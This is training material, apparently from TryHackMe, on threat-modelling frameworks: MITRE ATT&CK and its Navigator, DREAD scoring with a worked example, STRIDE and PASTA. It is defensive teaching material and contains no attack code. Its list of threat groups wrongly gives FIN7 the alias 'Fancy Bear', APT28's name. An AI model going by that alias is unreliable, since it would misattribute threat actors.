![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/831d13f65b445128b6cf96a4dc43b5b9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/831d13f65b445128b6cf96a4dc43b5b9.png)

MITRE
 ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a
 comprehensive, globally accessible knowledge base of cyber adversary 
behaviour and tactics. Developed by the MITRE Corporation, it is a 
valuable resource for organisations to understand the different stages 
of cyber attacks and develop effective defences.

The 
ATT&CK framework is organised into a matrix that covers various 
tactics (high-level objectives) and techniques (methods used to achieve 
goals). The framework includes descriptions, examples, and mitigations 
for each technique, providing a detailed overview of threat actors' 
methods and tools.

For a quick example, let's examine one of the techniques in the framework - [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/).

As you can see in the provided link, the page contains five significant sections, namely:

1. Technique Name and Details
    
    Information
     such as name, detailed explanation of the technique, types of data or 
    logs that can help or detect, and platforms (Windows, MacOS, Linux) relevant to the technique.
    
    ![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/d9026d5ac1c84632ad1e45bd6208e7ae.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/d9026d5ac1c84632ad1e45bd6208e7ae.png)
    
2. Procedure Examples
    
    Real-world examples of how threat actors have employed the technique in their adversarial operations.
    
    ![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/218fa71ca2fe34549424b82152c4b5fb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/218fa71ca2fe34549424b82152c4b5fb.png)
    
3. **Mitigations**
    
    Recommended security measures and best practices to protect against the technique.
    
    ![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5cb8f4b6f8351efd801b134741e41536.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5cb8f4b6f8351efd801b134741e41536.png)
    
4. Detections
    
    Strategies and indicators that can help identify the technique, as well as potential challenges in detecting the technique.
    
    ![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e4a542bb8405b6bdfa0cf814c50f491c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e4a542bb8405b6bdfa0cf814c50f491c.png)
    
5. References
    
    External sources, reports, and articles that provide additional information, context, or examples related to the technique.
    
    ![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/40674f569307d70862844c0fcd69d7f5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/40674f569307d70862844c0fcd69d7f5.png)
    

By exploring the contents of a MITRE
 ATT&CK technique page, you may gain valuable insights into the 
specific methods employed by an adversary and enhance your 
organisation's overall security posture by implementing the suggested 
mitigations and detection strategies.

# Applying ATT&CK in Threat Modelling Process

MITRE
 ATT&CK can be integrated into our threat modelling process by 
mapping the identified threats and vulnerabilities to the tactics and 
techniques described in the ATT&CK Framework. We can insert a new 
entry in our methodology after the "**Identify Threats**" step.

- Identify Threats
    
    Identify
     potential threats that may impact the identified assets, such as cyber 
    attacks, physical attacks, social engineering, and insider threats.
    
- **Map to MITRE ATT&CK**
    
    Map the identified threats to the corresponding tactics and techniques in the MITRE
     ATT&CK Framework. For each mapped technique, utilise the 
    information found on the corresponding ATT&CK technique page, such 
    as the description, procedure examples, mitigations, and detection 
    strategies, to gain a deeper understanding of the threats and 
    vulnerabilities in your system.
    

Incorporating
 the framework in our threat modelling process ensures a comprehensive 
understanding of the potential security threats. It enables a better 
application of countermeasures to reduce the overall risk to your 
organisation.

# Utilising ATT&CK for Different Use Cases

Aside from incorporating MITRE
 ATT&CK in a threat modelling process, MITRE ATT&CK can be used 
in various cases depending on your organisation's needs. To wrap up this
 task, here is a list of some use cases for utilising this framework.

1. Identifying potential attack paths based on your infrastructure
    
    Based
     on your assets, the framework can map possible attack paths an attacker
     might use to compromise your organisation. For example, if your 
    organisation uses Office 365, all techniques attributed to this platform
     are relevant to your threat modelling exercise.
    
2. Developing threat scenarios
    
    MITRE
     ATT&CK has attributed all tactics and techniques to known threat 
    groups. This information can be leveraged to assess your organisation 
    based on threat groups identified to be targeting the same industry.
    
3. Prioritising vulnerability remediation
    
    The information provided for each MITRE
     ATT&CK technique can be used to assess the significant impact that 
    may occur if your organisation experiences a similar attack. Given this,
     your security team can identify the most critical vulnerabilities to 
    address.
    

Note that the usage of this framework is
 not limited to the provided use cases above. It is still under your 
discretion how to utilise the information provided by the framework 
effectively.

To improve the overall threat modelling process with MITRE ATT&CK, let's integrate the usage of ATT&CK Navigator in mapping the threats identified on the following task.

**Mapping with ATT&CK Navigator**

# ATT&CK Navigator

Before discussing the ATT&CK Navigator, you may start the machine attached to this room by clicking the **Start Machine** button. Once the machine is up, access the ATT&CK Navigator webpage via the **AttackBox** or **VPN** using this link - [http://10.10.20.96](http://10.10.20.96/). You will see this landing page once you access the provided link.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5ae5d848988625b56d014cf8a8ed24fd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5ae5d848988625b56d014cf8a8ed24fd.png)

**Note: This open-source application is also accessible via this [link](https://mitre-attack.github.io/attack-navigator/). However, we will use the provided VM to have consistency in the ATT&CK Navigator version used in this task.**

Now that the web application is running, let's discuss the MITRE ATT&CK Navigator!

The
 MITRE ATT&CK Navigator is an open-source, web-based tool that helps
 visualise and navigate the complex landscape of the MITRE ATT&CK 
Framework. It allows security teams to create custom matrices by 
selecting relevant tactics and techniques that apply to their specific 
environment or threat scenario.

This task will have a walkthrough 
on creating a layer and mapping the relevant techniques for your threat 
modelling exercise. Here is a brief overview of the steps and features 
we will utilise.

1. Creation of a new layer.
2. Searching and selecting techniques.
3. Viewing, sorting and filtering layers.
4. Annotating techniques with fills, scores and comments.

# Creating a New Layer

To start with, let's create a new layer and choose enterprise.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/b297cc481e64b98e727c0c2bc3c1bb78.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/b297cc481e64b98e727c0c2bc3c1bb78.png)

You
 may have observed that there are three options for creating a new 
layer. These layers pertain to the three MITRE ATT&CK matrices, 
namely:

- **Enterprise** - The Enterprise Matrix focuses on threats and techniques commonly used against enterprise networks.
- **Mobile** - The Mobile Matrix focuses on threats and techniques against mobile devices, such as smartphones and tablets.
- **ICS** - The ICS Matrix focuses on threats and techniques against industrial
control systems, which control critical infrastructure, such as power
plants, water treatment facilities, and transportation systems.

We
 have chosen the Enterprise Matrix to cover threat actors' typical 
techniques when targeting an organisation. After creating a new layer, 
you will have this view once the web page has loaded.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/d74cd02274b8f09d20cd6b2cf853c2a5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/d74cd02274b8f09d20cd6b2cf853c2a5.png)

# Searching and Selecting Techniques

The first important feature we want to utilise in this application is the search functionality under the **Selection Controls** panel. This feature allows us to search and multi-select techniques you want to highlight or mark.

You may press the magnifier button to access the right sidebar, search using any keywords, or choose any selection under **Techniques, Threat Groups, Software, Mitigations, Campaigns, or Data Sources**.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/04d12a47541923fc4a7b1ed229293fa1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/04d12a47541923fc4a7b1ed229293fa1.png)

For a quick example, search for **APT41** and hover its entry on the **Threat Groups**
 section. You may observe that it will highlight all techniques 
attributed to this threat group. Once you click the select button, the 
highlighted techniques will be selected as a group and can be annotated 
with a score or a background fill, which will be discussed in the 
following instructions.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/f11e5b772011876f8255d6abd97a1b1b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/f11e5b772011876f8255d6abd97a1b1b.png)

After
 selecting the threat group, you may also observe that the deselect 
button now has a numerical value. This indicates the current number of 
chosen techniques. You may press this button to remove all your current technique selections.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/9e443200b84f84d93773d6294ed2745e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/9e443200b84f84d93773d6294ed2745e.png)

Lastly,
 you may right-click any technique if you prefer to do an action on a 
single technique (e.g. select, add to selection, remove from selection).

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/10260d2f4c50533fbc471e86ed6b0bfb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/10260d2f4c50533fbc471e86ed6b0bfb.png)

# Viewing, Sorting and Filtering Layers

We will tackle the next set of features under the **Layer Controls** panel. However, we will only focus on the following:

- Exporting features (download as JSON, Excel, SVG) - This allows you to dump the
selected techniques, including all annotations. The data exported can be ingested again in the ATT&CK Navigator for future use.
- Filters - Allows you to filter techniques based on relevant platforms, such as
operating systems or applications. For a quick example, the image below
shows all techniques that are attributed to Office365.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/4ecfb35e8b4b7784e55d46e0e419980f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/4ecfb35e8b4b7784e55d46e0e419980f.png)

- Sorting - This allows you to sort the techniques by their alphabetical
arrangement or numerical scores. The image below shows that all
techniques are arranged alphabetically.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/4c4b5706ce7f8c6cefead64434592760.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/4c4b5706ce7f8c6cefead64434592760.png)

- Expand sub-techniques - View all underlying sub-techniques under each
technique, expanding the view for all techniques. You will have a
similar view with the image below once you have expanded the
sub-techniques.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/57b9e0faedfe675aacbb7e039c2347bb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/57b9e0faedfe675aacbb7e039c2347bb.png)

# Annotating Techniques

Now, the last set of features is under the **Technique Controls**
 panel. These buttons allow you to annotate details on selected 
techniques. For a quick run-through, here are the features under the 
panel mentioned (from left to right):

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/873f7f63e9ccdeca22cba95214f21179.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/873f7f63e9ccdeca22cba95214f21179.png)

- Toggle state - This feature allows you to disable the selected techniques, making their view greyed-out.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/baa4cdd097c0313b28e9f2619afd037c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/baa4cdd097c0313b28e9f2619afd037c.png)

- Background color - This allows you to change the background color of the selected
technique, for highlighting and grouping purposes.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e319c6fbf48e55db4295ffe97a2bc99c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/e319c6fbf48e55db4295ffe97a2bc99c.png)

- Scoring - Allows you to rate each technique or set of techniques based on
criteria depending on your needs, such as the impact of a technique.
- Comment - Allows you to add notes and observations to a technique.
- Link - Allows you to add external links, such as additional references related to the technique.
- Metadata - Allows you to add custom tags and labels to a particular technique.
- Clear annotations on selected - Remove all annotations on selected techniques.

The image below is an example of using Scoring, Comment, Link and Metadata features.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/a87be0e2e7f306a3ac0f52e0eacb9b7c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/a87be0e2e7f306a3ac0f52e0eacb9b7c.png)

# Utilising ATT&CK Navigator

To put the concepts of this framework into practice, let's use the following scenario below.

You
 are tasked to utilise the MITRE ATT&CK framework for your threat 
modelling exercise. The organisation you're currently working with is in
 the financial services industry. Given that, some known threat groups 
targeting this industry are:

- APT28 (Fancy Bear)
- APT29 (Cozy Bear)
- Carbanak
- FIN7 (Carbanak/Fancy Bear)
- Lazarus Group

In addition, your organisation uses the following technologies:

- Google Cloud Platform (GCP) for cloud infrastructure
- Online banking platform developed by internal developers
- A Customer Relationship Management (CRM) platform

Lastly, the critical assets that you handle based on your business stakeholders are the following:

- Customer financial data
- Transaction records
- Personally identifiable information (PII)

Given
 this scenario, you can use the MITRE ATT&CK framework and 
ATT&CK Navigator to map and understand the significant techniques 
attributed to the provided threat groups and those affecting GCP and web
 applications.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/c0c43eff99b8a297d50ecc36170e0518.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/c0c43eff99b8a297d50ecc36170e0518.png)

*Techniques used by APT28*

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/cb0e387e5b693a3d6eba7b839e5aef2d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/cb0e387e5b693a3d6eba7b839e5aef2d.png)

*Techniques related to Google Cloud*

Once
 these techniques are identified, you should prioritise the potential 
vulnerabilities that may affect the systems that handle your critical 
assets (financial data, transaction records, and PII). Some of the 
techniques that you may consider prioritising are the following:

- **Exploit Public-Facing Application (T1190)** - Securing the public-facing application is crucial to prevent unauthorised access attempts.
- **Exploitation for Privilege Escalation (T1068)** - The prevention of escalating attackers' privileges reduces the
chances of obtaining critical data only accessible to administrators.
- **Data from Cloud Storage (T1530)** - Since the cloud instance contains critical data, safeguarding the
confidentiality and integrity of the data stored is crucial.
- **Network Denial of Service (T1498)** - The technique may not directly target the critical data within the
cloud instance. Still, it can lead to service disruptions and potential
impacts on the availability and accessibility of the data.

Now
 that we have identified these, the next step for the threat modelling 
exercise is to remediate and apply appropriate security controls to 
reduce the potential attack surface of our organisation.

**DREAD Framework**

# What is the DREAD Framework?

The
 DREAD framework is a risk assessment model developed by Microsoft to 
evaluate and prioritise security threats and vulnerabilities. It is an 
acronym that stands for:

| **DREAD** | **Definition** |
| --- | --- |
| **Damage** | The
 potential harm that could result from the successful exploitation of a 
vulnerability. This includes data loss, system downtime, or reputational
 damage. |
| **Reproducibility** | The ease with 
which an attacker can successfully recreate the exploitation of a 
vulnerability. A higher reproducibility score suggests that the 
vulnerability is straightforward to abuse, posing a greater risk. |
| **Exploitability** | The
 difficulty level involved in exploiting the vulnerability considering 
factors such as technical skills required, availability of tools or 
exploits, and the amount of time it would take to exploit the 
vulnerability successfully. |
| **Affected Users** | The number or portion of users impacted once the vulnerability has been exploited. |
| **Discoverability** | The
 ease with which an attacker can find and identify the vulnerability 
considering whether it is publicly known or how difficult it is to 
discover based on the exposure of the assets (publicly reachable or in a
 regulated environment). |

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/8f27a0b481ec730e325da0f04d2b7715.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/8f27a0b481ec730e325da0f04d2b7715.png)

The categories are commonly phrased with the following questions to ingest the definitions provided above quickly:

- **Damage** - How bad would an attack be?
- **Reproducibility** - How easy is it to reproduce the attack?
- **Exploitability** - How much work is it to launch the attack?
- **Affected Users** - How many people will be impacted?
- **Discoverability** - How easy is it to discover the vulnerability?

Using the questions above assists in understanding each category and applying it in a risk-assessment context.

# DREAD Framework Guidelines

As
 mentioned above, the DREAD framework is an opinion-based model that 
heavily relies on an analyst's interpretation and assessment. However, 
the reliability of this framework can still be improved by following 
some guidelines:

1. Establish a standardised set of guidelines
and definitions for each DREAD category that provides a consistent
understanding of how to rate vulnerabilities. This can be supported by
providing examples and scenarios to illustrate how scores should be
assigned under various circumstances.
2. Encourage collaboration
and discussion among multiple teams. Constructive feedback from
different members aids in justifying the assigned scores, which can lead to a more accurate assessment.
3. Use the DREAD framework with
other risk-assessment methodologies and regularly review and update the
chosen methods and techniques to ensure they remain relevant and aligned with the organisation's needs.

By ensuring that these 
guidelines are strictly followed, organisations can reduce the 
subjective nature of the framework and improve the accuracy and 
reliability of their risk assessments.

# Qualitative Analysis Using DREAD Framework

The
 DREAD Framework is typically used for Qualitative Risk Analysis, rating
 each category from one to ten based on a subjective assessment and 
interpretation of the questions above. Moreover, the average score of 
all criteria will calculate the overall DREAD risk rating.

To understand how the scoring works, let's put the concepts into practice by using a good scenario.

A
 software company has developed a new website and needs to assess the 
risk associated with various security threats. Your team has created a 
guideline for scoring each component of the DREAD framework, as shown 
below:

| DREAD Score | 2.5 | 5 | 7.5 | 10 |
| --- | --- | --- | --- | --- |
| Damage | Minimal infrastructure information disclosure | Minimal information disclosure related to client data | Limited PII leak | Complete data leak |
| Reproducibility | Multiple attack vectors requiring technical expertise | Minor customisation for public exploits needed | Little prerequisite technical skills needed to run the exploit | Users with public exploits can successfully reproduce the exploit |
| Exploitability | Almost no public exploits are available and need customisation of scripts | Complicated exploit scripts available in the wild | Minimal technical skills are required to execute public exploits | Reliable Metasploit module exists |
| Affected Users | Almost none to a small subset | Around 10% of users | More than half of the user base | All users |
| Discoverability | The significant effort needed to discover the vulnerability chains for the exploit to work | Requires a manual way of verifying the vulnerability | Public scanning scripts not embedded in scanning tools exist | Almost all known scanning tools can find the vulnerability |

Given
 this guideline, we can assess some known vulnerabilities in the 
application. Below is an example of scoring provided for each 
vulnerability.

1. Unauthenticated Remote Code Execution (Score: 8)
    - Damage (D): **10**
    - Reproducibility (R): **7.5**
    - Exploitability (E): **10**
    - Affected Users (A): **10**
    - Discoverability (D): **2.5**
2. Insecure Direct Object References (IDOR) in User Profiles (Score: 6.5)
    - Damage (D): **2.5**
    - Reproducibility (R): **7.5**
    - Exploitability (E): **7.5**
    - Affected Users (A): **10**
    - Discoverability (D): **5**
3. Server Misconfiguration Leading to Information Disclosure (Score: 5)
    - Damage (D): **0**
    - Reproducibility (R): **10**
    - Exploitability (E): **10**
    - Affected Users (A): **0**
    - Discoverability (D): **5**

Now what's left is to prioritise the vulnerabilities based on their score and apply mitigations to secure the application.

**STRIDE Framework**

# What is the STRIDE Framework?

The
 STRIDE framework is a threat modelling methodology also developed by 
Microsoft, which helps identify and categorise potential security 
threats in software development and system design. The acronym STRIDE is
 based on six categories of threats, namely:

| **Category** | **Definition** | **Policy Violated** |
| --- | --- | --- |
| **Spoofing** | Unauthorised access or impersonation of a user or system. | Authentication |
| **Tampering** | Unauthorised modification or manipulation of data or code. | Integrity |
| **Repudiation** | Ability to deny having acted, typically due to insufficient auditing or logging. | Non-repudiation |
| **Information Disclosure** | Unauthorised access to sensitive information, such as personal or financial data. | Confidentiality |
| **Denial of Service** | Disruption of the system's availability, preventing legitimate users from accessing it. | Availability |
| **Elevation of Privilege** | Unauthorised elevation of access privileges, allowing threat actors to perform unintended actions. | Authorisation |

As
 you can see, the table above also provides what component of the CIA 
triad is violated. The STRIDE framework is built upon this foundational 
information security concept.

By systematically analysing these 
six categories of threats, organisations can proactively identify and 
address potential vulnerabilities in their systems, applications, or 
infrastructure, enhancing their overall security posture.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/8b7b10f1edb15a96ecb21c4edd6389b9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/8b7b10f1edb15a96ecb21c4edd6389b9.png)

To understand the framework better, let's deep-dive into each category and discuss some examples.

- Spoofing
    - Sending an email as another user.
    - Creating a phishing website mimicking a legitimate one to harvest user credentials.
- Tampering
    - Updating the password of another user.
    - Installing system-wide backdoors using an elevated access.
- Repudiation
    - Denying unauthorised money-transfer transactions, wherein the system lacks auditing.
    - Denying sending an offensive message to another person, wherein the person lacks proof of receiving one.
- Information Disclosure
    - Unauthenticated access to a misconfigured database that contains sensitive customer information.
    - Accessing public cloud storage that handles sensitive documents.
- Denial of Service
    - Flooding a web server with many requests, overwhelming its resources, and making it unavailable to legitimate users.
    - Deploying a ransomware that encrypts all system data that prevents other systems
    from accessing the resources the compromised server needs.
- Elevation of Privilege
    - Creating a regular user but being able to access the administrator console.
    - Gaining local administrator privileges on a machine by abusing unpatched systems.

The
 examples above illustrate various scenarios in which the categories can
 occur, emphasising the importance of implementing robust security 
measures to protect against these threats.

A typical 
representation of results after using the STRIDE framework is via a 
checklist table, wherein each use case is marked based on what STRIDE 
component affects it. In addition, some scenarios may cover multiple 
STRIDE components.

| **Scenario** | **Spoofing** | **Tampering** | **Repudiation** | **Information Disclosure** | **Denial of Service** | **Elevation of Privilege** |
| --- | --- | --- | --- | --- | --- | --- |
| **Sending a spoofed email, wherein the mail gateway lacks email security and logging configuration.** | **✔** |  | **✔** |  |  |  |
| **Flooding a web server with many requests that lack load-balancing capabilities.** |  |  |  |  | **✔** |  |
| **Abusing an SQL injection vulnerability.** |  | **✔** |  | **✔** |  |  |
| **Accessing public cloud storage (such as AWS S3 bucket or Azure blob) that handles customer data**. |  |  |  | **✔** |  |  |
| **Exploiting
 a local privilege escalation vulnerability due to the lack of system 
updates and modifying system configuration for a persistent backdoor.** |  | **✔** |  |  |  | **✔** |

# Threat Modelling With STRIDE

To
 implement the STRIDE framework in threat modelling, it is essential to 
integrate the six threat categories into a systematic process that 
effectively identifies, assesses, and mitigates security risks. Here is a
 high-level approach to incorporating STRIDE in the threat modelling 
methodologies we discussed.

1. System Decomposition
    
    Break
     down all accounted systems into components, such as applications, 
    networks, and data flows. Understand the architecture, trust boundaries,
     and potential attack surfaces.
    
2. Apply STRIDE Categories
    
    For
     each component, analyse its exposure to the six STRIDE threat 
    categories. Identify potential threats and vulnerabilities related to 
    each category.
    
3. Threat Assessment
    
    Evaluate the impact and likelihood of each identified threat. Consider the potential consequences and the ease of exploitation and prioritise threats based on their overall risk level.
    
4. Develop Countermeasures
    
    Design
     and implement security controls to address the identified threats 
    tailored to each STRIDE category. For example, to enhance email security
     and mitigate spoofing threats, implement DMARC, DKIM, and SPF, which 
    are email authentication and validation mechanisms that help prevent 
    email spoofing, phishing, and spamming.
    
5. Validation and Verification
    
    Test
     the effectiveness of the implemented countermeasures to ensure they 
    effectively mitigate the identified threats. If possible, conduct 
    penetration testing, code reviews, or security audits.
    
6. Continuous Improvement
    
    Regularly
     review and update the threat model as the system evolves and new 
    threats emerge. Monitor the effective countermeasures and update them as
     needed.
    

By following this approach, you can effectively
 incorporate the STRIDE framework into your threat modelling process, 
ensuring a comprehensive analysis of potential security threats.

**PASTA Framework**

**What is the PASTA Framework?**

PASTA,
 or Process for Attack Simulation and Threat Analysis, is a structured, 
risk-centric threat modelling framework designed to help organisations 
identify and evaluate security threats and vulnerabilities within their 
systems, applications, or infrastructure. PASTA provides a systematic, 
seven-step process that enables security teams to understand potential 
attack scenarios better, assess the likelihood and impact of threats, 
and prioritise remediation efforts accordingly.

This framework was created by Tony UcedaVélez and Marco Morana. They introduced the PASTA framework in their book **"Risk Centric Threat Modeling: Process for Attack Simulation and Threat Analysis"**, published in 2015.

# Seven-Step Methodology

Similar to the high-level process discussed in the previous task, the PASTA
 framework covers a series of steps, from defining the scope of the 
threat modelling exercise to risk and impact analysis. Below is an 
overview of the seven-step methodology of the PASTA Framework.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ae0317162059a8fcf5730e38d3853e01.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ae0317162059a8fcf5730e38d3853e01.svg)

1. Define the Objectives
    
    Establish
     the scope of the threat modelling exercise by identifying the systems, 
    applications, or networks being analysed and the specific security 
    objectives and compliance requirements to be met.
    
2. Define the Technical Scope
    
    Create
     an inventory of assets, such as hardware, software, and data, and 
    develop a clear understanding of the system's architecture, 
    dependencies, and data flows.
    
3. Decompose the Application
    
    Break
     down the system into its components, identifying entry points, trust 
    boundaries, and potential attack surfaces. This step also includes 
    mapping out data flows and understanding user roles and privileges 
    within the system.
    
4. Analyse the Threats
    
    Identify
     potential threats to the system by considering various threat sources, 
    such as external attackers, insider threats, and accidental exposures. 
    This step often involves leveraging industry-standard threat 
    classification frameworks or attack libraries.
    
5. Vulnerabilities and Weaknesses Analysis
    
    Analyse
     the system for existing vulnerabilities, such as misconfigurations, 
    software bugs, or unpatched systems, that an attacker could exploit to 
    achieve their objectives. Vulnerability assessment tools and techniques,
     such as static and dynamic code analysis or penetration testing, can be
     employed during this step.
    
6. Analyse the Attacks
    
    Simulate
     potential attack scenarios and evaluate the likelihood and impact of 
    each threat. This step helps determine the risk level associated with 
    each identified threat, allowing security teams to prioritise the most 
    significant risks.
    
7. Risk and Impact Analysis
    
    Develop
     and implement appropriate security controls and countermeasures to 
    address the identified risks, such as updating software, applying 
    patches, or implementing access controls. The chosen countermeasures 
    should be aligned with the organisation's risk tolerance and security 
    objectives.
    

# PASTA

To effectively implement the PASTA framework and optimise its benefits, you may follow these practical guidelines for each step of the methodology.

| **Define the Objectives** | • Set clear and realistic security objectives for the threat modelling exercise.
• Identify relevant compliance requirements and industry-specific security standards. |
| --- | --- |
| **Define the Technical Scope** | • Identify all critical assets, such as systems and applications, that handle sensitive data owned by the organisation.
• Develop a thorough understanding of the system architecture, including data flows and dependencies. |
| **Decompose the Application** | • Break down the system into manageable components or modules.
• Identify and document each component's possible entry points, trust boundaries, attack surfaces, data flows, and user flows. |
| **Analyse the Threats** | • Research and list potential threats from various sources, such as external attackers, insider threats, and accidental exposures.
• Leverage threat intelligence feeds and industry best practices to stay updated on emerging threats. |
| **Vulnerabilities and Weaknesses Analysis** | • Use
 a combination of tools and techniques, such as static and dynamic code 
analysis, vulnerability scanning, and penetration testing, to identify 
potential weaknesses in the system.
• Keep track of known vulnerabilities and ensure they are addressed promptly. |
| **Analyse the Attacks** | • Develop realistic attack scenarios and simulate them to evaluate their potential consequences.
• Create
 a blueprint of scenarios via Attack Trees and ensure that all use cases
 are covered and aligned with the objective of the exercise. |
| **Risk and Impact Analysis** | • Assess the likelihood and impact of each identified threat and prioritise risks based on their overall severity.
• Determine
 the most effective and cost-efficient countermeasures for the 
identified risks, considering the organisation's risk tolerance and 
security objectives. |

These guidelines provide a foundation for effectively using the PASTA
 framework's seven-step methodology. However, adapting and customising 
the approach according to your organisation's unique needs and 
requirements is crucial.

# Benefits of Using the Framework

This
 framework, being risk-centric, offers numerous benefits for 
organisations seeking to enhance their security posture through threat 
modelling.

- The framework is adaptable to unique objectives
and helps organisations align with compliance requirements by
systematically identifying and addressing security risks while ensuring
proper security controls are in place.
- Like the other
frameworks, PASTA fosters collaboration between stakeholders, such as
developers, architects, and security professionals, promoting a shared
understanding of security risks and facilitating communication across
the organisation.
- In addition, the PASTA methodology helps organisations meet compliance requirements by
systematically identifying and addressing security risks and ensuring
that appropriate security controls are in place.
- Lastly, the primary reason to use PASTA is its comprehensive and systematic process, ensuring a thorough
analysis of the entire risk landscape. Organisations can proactively
address security risks by employing PASTA, tailoring the seven-step
methodology to their unique needs, and maintaining a solid security
posture.

To conclude the room, let's summarise the use case applications of each framework:

| Framework | Use Case Applications |
| --- | --- |
| MITRE ATT&CK | Unlike DREAD
 and STRIDE, which focus more on potential risks and vulnerabilities, 
ATT&CK provides a practical and hands-on approach by mapping 
adversary tactics.
• Assess the effectiveness of existing controls against known attack techniques used by threat actors. |
| DREAD | DREAD
 offers a more numerical and calculated approach to threat analysis than
 STRIDE or MITRE ATT&CK, making it excellent for clearly 
prioritising threats.

• Qualitatively assess the potential risks associated with specific threats.
• Prioritise risk mitigation based on the collective score produced by each DREAD component. |
| STRIDE | While other frameworks like MITRE
 ATT&CK focus on real-world adversary tactics, STRIDE shines in its 
structure and methodology, allowing for a systematic review of threats 
specific to software systems.

• Analyse and categorise threats in software systems.
• Identify potential vulnerabilities in system components based on the six STRIDE threat categories.
• Implement appropriate security controls to mitigate specific threat types. |
| PASTA | Excellent for aligning threat modelling with business objectives. Unlike other frameworks, PASTA integrates business context, making it a more holistic and adaptable choice for organisations.

• Conduct risk-centric threat modelling exercises aligned with business objectives.
• Prioritise threats based on their potential impact and risk level to the organisation.
• Build a flexible methodology that can be adapted to different organisational contexts. |

In general, all these frameworks significantly aid in reducing risks in organisations by:

- Enhancing threat awareness and identifying vulnerabilities
- Prioritising risk mitigation efforts and optimising security controls
- Continuous improvement and adaptation to evolving threats

All
 four frameworks have their unique strengths and applications in threat 
modelling. Leveraging these frameworks in real-world scenarios can 
significantly enhance an organisation's ability to identify and mitigate
 risks, thereby reducing the overall risk landscape and improving 
resilience against potential threats.

## **RISK MANAGEMENT**

**Basic Terminology**

Before starting, it is 
essential to define the main terms to avoid ambiguity or confusion. To 
study risk management, we need to ensure a proper understanding of the 
following terms:

